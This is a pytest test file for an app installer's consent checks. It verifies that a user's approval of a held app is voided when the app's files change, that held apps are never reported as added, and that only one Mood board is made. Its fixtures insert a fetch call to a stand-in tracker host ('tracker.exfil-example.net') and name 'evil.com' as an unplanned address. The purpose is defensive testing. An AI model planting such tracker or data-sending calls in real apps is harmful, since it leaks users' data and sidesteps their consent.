"""Held-after-yes, held apps never read "Added", one Mood board.

Findings:

* After the owner said yes to a held app, a new outgoing address was put in
  its files; the add ended ``ready`` with no second question (the address was
  filed as "an account you would set up yourself" and switched off).
* After "Add it anyway" the app host held the app again (it never heard her
  yes), the app could not open, and the owner was told "Added".
* The wedding build made two Mood boards and said "Put a Mood board on your
  home page ... done" four times; "Added <app>" was said twice.

The app host is a fake with its pinned signature whose verdict comes from
the real ``webapps.install.decide`` (so ``allowed_holds`` means what it means
there); the address scan is the real ``webapps.scan``.
"""
from __future__ import annotations

import os
import sys
import types

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "fixtures", "integrate"))
import integrate_support as sup  # noqa: E402

from puffpai import api_server, plain_words  # noqa: E402
from puffpai.integrate import apply, palette, records, wording  # noqa: E402
from puffpai.security import consent_tickets  # noqa: E402
from puffpai.webapps import install as real_install  # noqa: E402
from puffpai.wizard import factory  # noqa: E402

AUTH = {"Authorization": f"Bearer {api_server._API_KEY}"}
DEVICE = "deviceaaaa000001"
PAIRED = {**AUTH, "X-Puff-Device-Id": DEVICE}
ITEM = {"id": "apps_code:github:someone/wedding-planner", "label": "Big Day",
        "apply": {"kind": "code_project", "ref": "github:someone/wedding-planner"}}
TRACKER = "tracker.exfil-example.net"


def app_host(runtime_hosts=("evil.com",), *, honours_yes: bool = True, n_actions: int = 2):
    """A fake app host: holds for runtime addresses the plan did not show,
    lets through exactly the hold codes in ``source["allowed_holds"]`` (the
    real ``install.decide``), and says its own closing line like the real
    one does."""
    mod = types.ModuleType("puffpai.webapps.install")
    mod.calls = []
    mod.uninstalled = []

    def install_static(app_id, files_dir, *, source, name, purpose, jobs, progress):
        mod.calls.append({"app_id": app_id, "files_dir": files_dir, "source": dict(source)})
        planned = {str(h).lower() for h in source.get("runtime_hosts") or []}
        new = [h for h in runtime_hosts if h not in planned]
        rows = [{"code": "too_big", "result": "pass", "why": ""},
                {"code": "runtime_hosts_new", "result": "fail" if new else "pass",
                 "why": ", ".join(new)}]
        allowed = frozenset(source.get("allowed_holds") or []) if honours_yes else frozenset()
        verdict = real_install.decide(rows, allowed_holds=allowed)
        hosts = [{"host": h, "for": "fetching or saving data online", "state": "off"}
                 for h in runtime_hosts]
        progress("Toolsmith is copying the app's files.")
        if verdict != "allow":
            progress("Drawbridge wants you to look at this app before it runs.")
            return {"app_id": app_id, "hosts": hosts, "actions": [], "abilities": [],
                    "verdict": {"verdict": verdict, "rows": rows}, "drivable": False,
                    "lines": ["Drawbridge wants you to look at this app before it runs."]}
        line = f"Added {name}. Your bot can do {n_actions} things in it."
        progress(line)
        return {"app_id": app_id, "hosts": hosts, "actions": [],
                "abilities": ["add a row", "read the list"],
                "verdict": {"verdict": "allow", "rows": rows}, "drivable": True,
                "lines": [line]}

    mod.install_static = install_static
    mod.uninstall = lambda app_id: mod.uninstalled.append(app_id)
    return mod


@pytest.fixture
def world(tmp_path, monkeypatch):
    monkeypatch.setenv("PUFFPAI_STATE_DIR", str(tmp_path / "state"))
    sup.fresh_drawbridge(monkeypatch)
    consent_tickets.reset()
    tree = tmp_path / "tree"

    def build(web, *, extra=None):
        sup.static_tree(str(tree))
        for rel, text in (extra or {}).items():
            sup.write(str(tree), rel, text)
        f = sup.found()
        fakes = sup.install_fakes(monkeypatch, str(tmp_path / "apps"),
                                  founds={ITEM["id"]: f},
                                  archives={sup.archive_url(f): sup.tar_gz_of(str(tree))},
                                  webapps=web)
        return {"apps": str(tmp_path / "apps"), **fakes}
    yield build
    consent_tickets.reset()


@pytest.fixture
def client():
    api_server.app.config.update(TESTING=True)
    return api_server.app.test_client()


def _yes(client, rid):
    got = client.post(f"/integrations/{rid}/decide", headers=PAIRED, json={"yes": True})
    assert got.status_code == 200, got.get_json()
    return got.get_json()


def _src(w, rid):
    return os.path.join(w["apps"], rid, "src")


# -- held after yes: the files are re-checked against what she said yes to ------------

def test_a_new_address_put_in_the_files_after_the_question_asks_again(world, client):
    """The live case: held for evil.com, then a fetch to a tracker was added
    to the app's files, then she said yes."""
    web = app_host()
    w = world(web)
    out = apply.apply_code_project(ITEM, sup.Ctx())
    rid = out["integration_id"]
    assert out["status"] == "held" and "Added" not in out["line"]
    assert "it wants to reach evil.com, which the plan did not show" in out["line"]
    sup.write(_src(w, rid), "js/timer.js",
              f'fetch("https://{TRACKER}/p?x=1");\n')
    target_before = records.get(rid)["held"]["ticket_target"]

    body = _yes(client, rid)
    assert body["status"] == "held", body
    assert "changed since you were asked" in body["line"]
    assert "Added" not in body["line"]
    rec = records.get(rid)
    assert rec["status"] == "held" and rec["held"]["reasons"] == ["files_changed"]
    assert rec["held"]["ticket_target"] and rec["held"]["ticket_target"] != target_before
    assert len(web.calls) == 1                          # never set up again on the old yes
    assert all(plain_words.check(line) == [] for line in [body["line"], *body["lines"]])

    # Her yes to look again: every finding is asked again, with the new address named.
    again = _yes(client, rid)
    assert again["status"] == "held", again
    assert f"it wants to reach evil.com and {TRACKER}, which the plan did not show" \
        in again["line"]
    assert records.get(rid)["held"]["reasons"] == ["runtime_hosts_new"]

    done = _yes(client, rid)
    assert done["status"] == "added", done
    rec = records.get(rid)
    assert rec["status"] == "ready"
    out_hosts = {o["host"]: o for o in rec["outside"]}
    assert set(out_hosts) == {"evil.com", TRACKER}
    assert out_hosts[TRACKER]["state"] == "off"
    assert "yours" not in str(rec["outside"]) and "account" not in str(rec["outside"])
    # The app host heard her yes for exactly the code she was asked about.
    assert web.calls[-1]["source"]["allowed_holds"] == ["runtime_hosts_new"]
    assert consent_tickets._live == []  # noqa: SLF001


def test_any_change_to_the_files_after_the_question_asks_again(world, client):
    """Even a change no check notices voids the yes."""
    web = app_host()
    w = world(web)
    rid = apply.apply_code_project(ITEM, sup.Ctx())["integration_id"]
    sup.write(_src(w, rid), "notes.txt", "harmless\n")
    body = _yes(client, rid)
    assert body["status"] == "held"
    assert "changed since you were asked" in body["line"]
    assert wording.REASONS["files_changed"] in body["line"]
    assert len(web.calls) == 1


def test_a_removed_file_after_the_question_asks_again(world, client):
    web = app_host()
    w = world(web)
    rid = apply.apply_code_project(ITEM, sup.Ctx())["integration_id"]
    os.remove(os.path.join(_src(w, rid), "favicon.svg"))
    assert _yes(client, rid)["status"] == "held"
    assert records.get(rid)["held"]["reasons"] == ["files_changed"]


def test_unchanged_files_need_one_yes_only(world, client):
    web = app_host()
    world(web)
    rid = apply.apply_code_project(ITEM, sup.Ctx())["integration_id"]
    body = _yes(client, rid)
    assert body["status"] == "added", body
    assert "changed since you were asked" not in body["line"]


def test_a_real_address_filed_as_yours_is_held_before_any_yes(world):
    """No yes at all: an app whose files reach a real address the scan filed
    as "an account you would set up yourself" is still asked about."""
    web = app_host(runtime_hosts=())
    world(web, extra={"js/timer.js": f'fetch("https://{TRACKER}/p?x=1");\n'})
    ctx = sup.Ctx()
    out = apply.apply_code_project(ITEM, ctx)
    assert out["status"] == "held"
    assert f"it wants to reach {TRACKER}, which the plan did not show" in out["line"]
    assert web.uninstalled == [web.calls[0]["app_id"]]


def test_a_placeholder_address_is_not_a_question(world):
    web = app_host(runtime_hosts=())
    world(web, extra={"js/api.js": 'fetch("https://api.example.com/v1/users/42");\n'})
    out = apply.apply_code_project(ITEM, sup.Ctx())
    assert out["status"] == "added", out
    assert records.get(out["integration_id"])["outside"] == []


@pytest.mark.parametrize("host,placeholder", [
    ("api.example.com", True), ("example.org", True), ("x.example.net", True),
    ("server.test", True), ("a.invalid", True), ("localhost", True), ("app.localhost", True),
    ("site.example", True),
    (TRACKER, False), ("myexample.com", False), ("your-domain.com", False),
    ("xxxtracker.io", False), ("example.com.evil.io", False),
])
def test_only_names_that_can_never_be_real_are_placeholders(host, placeholder):
    assert apply._placeholder_host(host) is placeholder  # noqa: SLF001


def test_the_scan_filing_is_read_honestly(tmp_path):
    sup.write(str(tmp_path), "index.html", "<script src='a.js'></script>")
    sup.write(str(tmp_path), "a.js", f'fetch("https://{TRACKER}/p");\n'
                                     'fetch("https://api.example.com/v1");\n')
    got = apply._real_hosts_filed_as_yours(str(tmp_path))  # noqa: SLF001
    assert [h["host"] for h in got] == [TRACKER]
    assert got[0]["state"] == "off" and got[0]["for"]
    assert "yours" not in got[0]["for"] and "account" not in got[0]["for"]


# -- a held app is never "Added" ------------------------------------------------------

def test_after_add_it_anyway_the_app_host_hears_the_yes_and_it_opens(world, client):
    """The grocery / interview-drill case: the app host itself holds for the
    new address; after her yes it must set the app up, not hold it again."""
    web = app_host()
    world(web)
    out = apply.apply_code_project(ITEM, sup.Ctx())
    rid = out["integration_id"]
    assert out["status"] == "held"
    first = web.calls[0]["source"]
    assert "allowed_holds" not in first                    # no yes, nothing let through
    assert first["runtime_hosts"] == []                    # the plan showed none
    body = _yes(client, rid)
    assert body["status"] == "added", body
    assert web.calls[-1]["source"]["allowed_holds"] == ["runtime_hosts_new"]
    rec = records.get(rid)
    assert rec["status"] == "ready" and rec["app_id"] == web.calls[-1]["app_id"]
    assert rec["app_id"] not in web.uninstalled


def test_an_app_host_that_still_holds_after_the_yes_is_never_called_added(world, client):
    web = app_host(honours_yes=False)
    world(web)
    rid = apply.apply_code_project(ITEM, sup.Ctx())["integration_id"]
    body = _yes(client, rid)
    assert body["status"] == "failed", body
    assert "Added" not in body["line"] and all("Added" not in x for x in body["lines"])
    assert wording.SET_UP_FAILED in body["line"]
    rec = records.get(rid)
    assert rec["status"] == "failed" and rec["app_id"] is None
    assert set(web.uninstalled) == {c["app_id"] for c in web.calls}


def test_a_held_line_names_the_reason_and_waits_for_her_yes(world):
    web = app_host(runtime_hosts=("evil.com", "b.io", "c.io", "d.io"))
    world(web)
    ctx = sup.Ctx()
    out = apply.apply_code_project(ITEM, ctx)
    assert out["status"] == "held"
    assert out["line"].startswith("Drawbridge found something the plan did not show: "
                                  "it wants to reach b.io, c.io, d.io and 1 more")
    assert out["line"].endswith(wording.HELD_WAITING)
    assert not any(line.startswith("Added") for line in ctx.lines)
    assert all(plain_words.check(line) == [] for line in ctx.lines)


# -- each line once --------------------------------------------------------------------

def _run(fn, item):
    streamed: list[str] = []
    actx = factory._ApplierContext({}, True, None)  # noqa: SLF001
    res = factory._run_applier(fn, item, actx, streamed.append)  # noqa: SLF001
    return res, streamed


def test_an_added_app_says_added_once(world):
    web = app_host(runtime_hosts=())
    world(web)
    res, streamed = _run(apply.apply_code_project, ITEM)
    assert res["status"] == "added", streamed
    added = [line for line in streamed if line.startswith("Added")]
    assert added == ["Added Big Day. Your bot can do 2 things in it."], streamed
    assert res["line"] == added[0]
    assert len(streamed) == len(set(streamed)), streamed


# -- one Mood board per bot ------------------------------------------------------------

@pytest.fixture
def boards(tmp_path, monkeypatch):
    monkeypatch.setenv("PUFFPAI_STATE_DIR", str(tmp_path / "state"))

    def mood_boards():
        return [r for r in records.all() if r.get("mode") == palette.KIND]
    return mood_boards


def test_two_plan_lines_make_one_mood_board_and_say_it_once(boards):
    """Both picture lines of a plan ("use your own pictures", "colours and
    themes") go through this applier; the wedding build made two boards."""
    own = {"id": "pictures:buildbot:own-pictures-j2", "need": "j2",
           "apply": {"kind": "folder_palette", "ref": "folder"}}
    pal = {"id": "pictures:buildbot:palette-j2", "need": "j2",
           "apply": {"kind": "folder_palette", "ref": "palette"}}
    first, lines1 = _run(palette.apply_palette, own)
    second, lines2 = _run(palette.apply_palette, pal)
    assert first["status"] == second["status"] == "added"
    assert len(boards()) == 1
    # (the factory shows each line trimmed)
    assert lines1 == [wording.PALETTE_ADDED.strip()]
    assert lines2 == [wording.PALETTE_SAME.strip()]
    record = lines1 + lines2
    assert record.count(wording.PALETTE_ADDED.strip()) == 1
    # The closing screen's "Added for you" lines, from the factory's record.
    rows = [{"ok": True, "line": first["line"], "label": "a"},
            {"ok": True, "line": second["line"], "label": "b"}]
    shown = [x.strip() for x in factory.added_lines({"factory": {"items": rows}})]
    assert shown.count(wording.PALETTE_ADDED.strip()) == 1 and len(set(shown)) == 2
    assert all(plain_words.check(x) == [] for x in record)


def test_a_later_run_uses_the_same_board(boards):
    a = palette.apply_palette({"id": "x", "need": ""}, sup.Ctx())
    b = palette.apply_palette({"id": "y", "need": ""}, sup.Ctx())
    c = palette.apply_palette({"id": "z", "need": ""}, sup.Ctx())
    assert a["integration_id"] == b["integration_id"] == c["integration_id"]
    assert len(boards()) == 1


def test_a_board_she_removed_can_be_made_again(boards):
    a = palette.apply_palette({"id": "x", "need": ""}, sup.Ctx())
    rec = records.get(a["integration_id"])
    rec["status"] = "removed"
    records.save(rec)
    b = palette.apply_palette({"id": "x", "need": ""}, sup.Ctx())
    assert b["integration_id"] != a["integration_id"] and b["line"] == wording.PALETTE_ADDED
    assert [r["id"] for r in boards() if r["status"] == "ready"] == [b["integration_id"]]


# -- the same two live cases on the real app host (real install, real scan) -----------

@pytest.fixture
def real_host(tmp_path, monkeypatch):
    """The real ``webapps.install`` (its own scan, verdict and install), with
    the page runner switched off (nothing is driven) and fresh registries."""
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), "fixtures", "webapps"))
    import app_host_kit
    from puffpai import drawbridge
    from puffpai.integrate import actions as integrate_actions
    from puffpai.webapps import host, runner_host
    from puffpai.webapps import wording as web_wording
    app_host_kit.seal_key(monkeypatch, tmp_path)
    monkeypatch.setattr(runner_host, "availability", lambda: (False, web_wording.NODE_TOO_OLD))
    monkeypatch.setattr(integrate_actions, "_SOURCES", {})
    monkeypatch.setattr(drawbridge, "_REGISTRY", {"closed": False})
    yield host
    host.refresh()


SHOP = "api.shop-sample.net"


def test_real_app_host_add_it_anyway_really_sets_it_up(world, client, real_host):
    """The grocery case on the real app host: held for a data address, yes,
    and the app is installed (it can open), not held again."""
    world(real_install, extra={"js/prices.js": f'fetch("https://{SHOP}/v1/prices");\n'})
    out = apply.apply_code_project(ITEM, sup.Ctx())
    rid = out["integration_id"]
    assert out["status"] == "held", out
    assert f"it wants to reach {SHOP}" in out["line"]
    assert not real_host.installed_ids()                     # held: nothing set up
    body = _yes(client, rid)
    assert body["status"] == "added", body
    rec = records.get(rid)
    assert rec["status"] == "ready"
    assert rec["app_id"] in real_host.installed_ids()        # it really opens
    assert real_host.read_record(rec["app_id"])["status"] == "installed"
    assert rec["outside"] == [{"host": SHOP, "for": "fetching or saving data online",
                               "state": "off"}]


def test_real_app_host_new_address_after_the_question_asks_again(world, client, real_host):
    """Case f on the real app host and scan: the tracker the scan files as
    "yours" is added after the question; the yes does not cover it."""
    w = world(real_install, extra={"js/prices.js": f'fetch("https://{SHOP}/v1/prices");\n'})
    rid = apply.apply_code_project(ITEM, sup.Ctx())["integration_id"]
    sup.write(_src(w, rid), "js/timer.js", f'fetch("https://{TRACKER}/p?x=1");\n')
    body = _yes(client, rid)
    assert body["status"] == "held" and "changed since you were asked" in body["line"]
    assert not real_host.installed_ids()                     # the old yes set up nothing
    again = _yes(client, rid)
    assert again["status"] == "held"
    assert f"it wants to reach {SHOP} and {TRACKER}" in again["line"]
    done = _yes(client, rid)
    assert done["status"] == "added", done
    rec = records.get(rid)
    assert rec["app_id"] in real_host.installed_ids()
    assert {o["host"]: o["state"] for o in rec["outside"]} == {SHOP: "off", TRACKER: "off"}
